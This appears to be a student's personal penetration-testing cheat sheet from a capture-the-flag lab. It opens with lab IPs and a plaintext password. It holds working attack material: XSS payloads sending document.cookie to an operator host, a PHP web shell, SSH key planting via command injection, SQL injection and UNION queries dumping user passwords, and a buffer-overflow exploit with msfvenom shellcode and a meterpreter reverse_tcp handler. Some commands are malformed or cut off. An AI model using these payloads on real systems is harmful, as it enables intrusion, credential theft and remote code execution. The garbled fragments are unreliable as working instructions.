http://10.50.22.9:8000/ - ctfd 
10.50.34.208- grey 
QjnK39dDzI8iYsH password(cancer) 



------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                       Reconnaissance
------------------------------------------------------------------------------------------------------------------------------------------------------------
HTML/websites:
scraper:
 
import lxml.html 
import requests 


page = requests.get('http://quotes.toscrape.com') 
tree = lxml.html.fromstring(page.content) 

results = tree.xpath('//small[@class="author"]/text()') 

print("Results: ", results) 


host enum:
nmap -Pn -T4 --min--rate 32479827348441 10.50.27.95 -p22,80,8080,2222,4444

ping sweep: 
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done


nmap scripts: 
--script=banner.nse 
--script=http.enum.nse 
--script=smb-os-discovery 
--script

run on op station 
<script>document.location="http://OPIP:8000"+document.cookie;</script> 
python3 -m http.server




<script> document.location="http://SEVERIP/uploads/cookie_stealer.php? username ="+document.cookie;</script> 






<HTML><BODY> 
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd"> 
<INPUT TYPE="submit" VALUE="send"> 
</FORM> 
<?php 
if($_GET['cmd']) {
system($_GET['cmd])
} 
?>
</pre> 
</BODY></HTML> 



ssh-keygen -t rsa -b 4096 
upload public key to .ssh via command injection 
ssh -I ~/.ssh/id_rsa WWWDATA@ip 









------------------------------------------------------------------------------------------------------------------------------------------------------------



mysql
-starts sql

show databases;
-show data

show tables from session;
-show specific table from database

select * from session.Tires;
-select everything from a session

select tireid,name,cost from seesion.Tires;
-shows specific columns from session

use session;
-go into session
  select * from Tires;
  

-character entries are in quotes by default and can be broken by adding your own quotes

User' OR '1=1

http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3
-find feilds available abd what order they display

Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns

User guide .columns in reasouce

Selection=2 UNION select name,type,cost from session.car;#

Selection=2 UNION select id,pass,name from session.user;#

xfreerdp /u:student /v:IP_Address /dynamic-resolution +glyph-cache +clipboard


0xff, oxe4, check for these q
find /b end of stack, beginning of stack, 0xff, 0xe4 
-----------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          overflowing da buffer 
-----------------------------------------------------------------------------------------------------------------------------------------------------------
run the program
see if u can overflow the program 
use gdb to analize the program (pdisass main) look for getuserinput
pdisass getuserinput, look for red one and find vuln - function gets,
grab pattern from wiremask.eu, insert into overflow, copy eip and put in back into to find offset 
make sure you have control of the eip (bunca As and Bs) 
env - gdb name of program or file program 
unset env LINES and unset env COLOUMNS 
info proc map to find start and end of stack(one above stack and one below heap has to be first ) 
find /b end of stack, beginning of stack, 0xff, 0xe4 
copy bunca addrs 
enter in code 
reverse it into eip 
make sure nop is sled 
gen shell code - msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
paste buf into code 





msfconsole
use multihandler
s import socket
  2 offset = "TRUN /.:/"
  3 offset += "A" * 2003
  4 eip = "\xa0\x12\x50\x62"
  5 nop = "\x90" * 16
  6 buf =  b""
  7 buf += b"\xd9\xcb\xb8\x19\x78\x52\x6b\xd9\x74\x24\xf4\x5b\x29"
  8 buf += b"\xc9\xb1\x59\x31\x43\x19\x03\x43\x19\x83\xeb\xfc\xfb"
  9 buf += b"\x8d\xae\x83\x74\x6d\x4f\x54\xea\xe7\xaa\x65\x38\x93"
 10 buf += b"\xbf\xd4\x8c\xd7\x92\xd4\x67\xb5\x06\xea\xc0\x70\x01"
 11 buf += b"\xc5\xd1\x0e\x3f\x0d\x1c\xd1\x6c\x71\x3f\xad\x6e\xa6"
 12 buf += b"\x9f\x8c\xa0\xbb\xde\xc9\x76\xb1\x0f\x87\xdf\xb2\x9d"
 13 buf += b"\x38\x6b\x86\x1d\x38\xbb\x8c\x1d\x42\xbe\x53\xe9\xfe"
 14 buf += b"\xc1\x83\x41\x74\x89\x3b\xea\xd2\x2a\x3d\x3f\x67\xe3"
 15 buf += b"\x49\x83\x59\x0b\xf8\x70\xad\x78\xfa\x50\xff\xbe\x51"
 16 buf += b"\x9d\xcf\x32\xab\xda\xe8\xac\xde\x10\x0b\x50\xd9\xe3"
 17 buf += b"\x71\x8e\x6c\xf3\xd2\x45\xd6\xd7\xe3\x8a\x81\x9c\xe8"
 18 buf += b"\x67\xc5\xfa\xec\x76\x0a\x71\x08\xf2\xad\x55\x98\x40"
 19 buf += b"\x8a\x71\xc0\x13\xb3\x20\xac\xf2\xcc\x32\x08\xaa\x68"
 20 buf += b"\x39\xbb\xbd\x0d\xc2\x43\xc2\x53\x54\x8f\x0f\x6c\xa4"
 21 buf += b"\x87\x18\x1f\x96\x08\xb3\xb7\x9a\xc1\x1d\x4f\xab\xc6"
 22 buf += b"\x9d\x9f\x13\x86\x63\x20\x63\x8e\xa7\x74\x33\xb8\x0e"
 23 buf += b"\xf5\xd8\x38\xae\x20\x74\x33\x38\xc1\xba\x5a\xe2\xbd"
 24 buf += b"\xb8\x5c\x07\x8d\x35\xba\x77\xa1\x15\x13\x38\x11\xd5"
 25 buf += b"\xc3\xd0\x7b\xda\x3c\xc0\x83\x31\x55\x6b\x6c\xef\x0d"
 26 buf += b"\x04\x15\xaa\xc6\xb5\xda\x61\xa3\xf6\x51\x83\x53\xb8"
 27 buf += b"\x91\xe6\x47\xad\xc5\x08\x98\x2e\x60\x08\xf2\x2a\x22"
 28 buf += b"\x5f\x6a\x31\x13\x97\x35\xca\x76\xa4\x32\x34\x07\x9c"
 29 buf += b"\x49\x03\x9d\xa0\x25\x6c\x71\x20\xb6\x3a\x1b\x20\xde"
 30 buf += b"\x9a\x7f\x73\xfb\xe4\x55\xe0\x50\x71\x56\x50\x04\xd2"
 31 buf += b"\x3e\x5e\x73\x14\xe1\xa1\x56\x26\xe6\x5d\x24\x01\x4f"
 32 buf += b"\x35\xd6\x11\x6f\xc5\xbc\x91\x3f\xad\x4b\xbd\xb0\x1d"
 33 buf += b"\xb3\x14\x99\x35\x3e\xf9\x6b\xa4\x3f\xd0\x2a\x78\x3f"
 34 buf += b"\xd7\xf6\x8b\x3a\x98\x09\x6c\xbb\xb0\x6d\x6d\xbb\xbc"
 35 buf += b"\x93\x52\x6d\x85\xe1\x95\xad\xb2\xfa\xa0\x90\x93\x90"
 36 buf += b"\xca\x87\xe4\xb0"
 37 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 38 s.connect(("10.50.39.109", 9999))
 39 print s.recv(1024)
 40 s.send(offset + eip + nop + buf )
 41 s.close()
et payload windows/meterpreter/reverse_tcp 
set lhost 0.0.0.0
set lport 5555



----------------------------------------------------------------------------------------------------------------------------------------------------------

find / -type f -perm /2000 -ls 2>/dev/null

https://gtfobins.github.io

